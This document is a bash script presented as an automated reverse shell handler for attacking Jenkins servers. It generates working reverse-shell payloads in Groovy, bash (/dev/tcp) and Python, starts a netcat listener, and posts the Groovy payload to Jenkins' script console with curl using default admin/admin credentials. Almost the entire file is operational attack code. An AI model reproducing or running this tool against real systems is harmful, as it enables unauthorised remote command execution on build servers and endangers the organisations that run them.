#!/bin/bash

echo "=========================================="
echo "  AUTOMATED REVERSE SHELL HANDLER"
echo "=========================================="
echo ""

LHOST="${1:-127.0.0.1}"
LPORT="${2:-9001}"
TARGET="${3:-http://localhost:8080}"
SHELL_TYPE="${4:-groovy}"

# Configuration - can be overridden with environment variables
JENKINS_USER="${JENKINS_USER:-admin}"
JENKINS_PASS="${JENKINS_PASS:-admin}"

OUTPUT_DIR="/tmp/jenkins-shells-$$"
mkdir -p "$OUTPUT_DIR"

echo "[+] Handler Configuration"
echo "    LHOST: $LHOST"
echo "    LPORT: $LPORT"
echo "    Target: $TARGET"
echo "    Shell Type: $SHELL_TYPE"
echo ""

case "$SHELL_TYPE" in
    groovy)
        echo "[*] Generating Groovy reverse shell payload"
        cat > "$OUTPUT_DIR/shell.groovy" << 'EOF'
String host="LHOST_PLACEHOLDER";
int port=LPORT_PLACEHOLDER;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;} catch (Exception e){}
};
p.destroy();s.close();
EOF
        sed -i "s/LHOST_PLACEHOLDER/$LHOST/g" "$OUTPUT_DIR/shell.groovy"
        sed -i "s/LPORT_PLACEHOLDER/$LPORT/g" "$OUTPUT_DIR/shell.groovy"
        PAYLOAD=$(cat "$OUTPUT_DIR/shell.groovy")
        ;;
    
    bash)
        echo "[*] Generating Bash reverse shell payload"
        PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        ;;
    
    python)
        echo "[*] Generating Python reverse shell payload"
        PAYLOAD="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$LHOST',$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
        ;;
    
    *)
        echo "[!] Unknown shell type: $SHELL_TYPE"
        exit 1
        ;;
esac

echo "[+] Payload generated: $OUTPUT_DIR/shell.groovy"
echo ""

echo "[*] Starting listener on $LHOST:$LPORT"
echo "[*] Listener will run in background..."
echo ""

nc -lvnp "$LPORT" > "$OUTPUT_DIR/shell-output.txt" 2>&1 &
LISTENER_PID=$!
echo "[+] Listener PID: $LISTENER_PID"
sleep 2

echo "[*] Deploying payload to Jenkins"
if [[ "$SHELL_TYPE" == "groovy" ]]; then
    curl -s -u "$JENKINS_USER:$JENKINS_PASS" "$TARGET/scriptText" \
        --data-urlencode "script=$PAYLOAD" \
        > "$OUTPUT_DIR/deploy-result.txt" 2>&1 &
    DEPLOY_PID=$!
    echo "[+] Deploy PID: $DEPLOY_PID"
fi

echo ""
echo "[+] Shell handler active!"
echo ""
echo "Monitor shell output:"
echo "    tail -f $OUTPUT_DIR/shell-output.txt"
echo ""
echo "Kill listener:"
echo "    kill $LISTENER_PID"
echo ""
echo "Interactive shell commands:"
echo "    echo 'whoami' | nc $LHOST $LPORT"
echo "    echo 'id' | nc $LHOST $LPORT"
echo "    echo 'pwd' | nc $LHOST $LPORT"
echo ""

cat > "$OUTPUT_DIR/shell-info.txt" << EOF
Reverse Shell Handler
=====================
LHOST: $LHOST
LPORT: $LPORT
Target: $TARGET
Listener PID: $LISTENER_PID
Deploy PID: ${DEPLOY_PID:-N/A}
Output: $OUTPUT_DIR/shell-output.txt

To interact:
  tail -f $OUTPUT_DIR/shell-output.txt
  
To cleanup:
  kill $LISTENER_PID
EOF

echo "[+] Shell info saved: $OUTPUT_DIR/shell-info.txt"
